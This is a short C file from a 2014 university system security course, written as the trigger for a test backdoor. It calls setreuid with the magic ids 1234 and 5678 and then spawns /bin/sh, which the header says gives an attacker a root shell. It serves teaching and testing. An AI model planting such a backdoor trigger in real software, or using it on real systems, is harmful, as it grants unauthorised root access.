/**********************************************************
	Last Updated: Nov 1, 2014
	CSE509 System Security 2014 Fall @CS SBU
	Written By: 
		Hyungjoon Koo (hykoo@cs.stonybrook.edu)
		Yaohui Chen (yaohchen@cs.stonybrook.edu)

	Description: 
		Backdoor for the testing purpose
		Given ruid and euid, the attacker can get root shell
***********************************************************/

#include <stdio.h>

int main(void)
{
	int ruid = 1234;
	int euid = 5678;
	
	setreuid(ruid, euid);
	system("/bin/sh");
}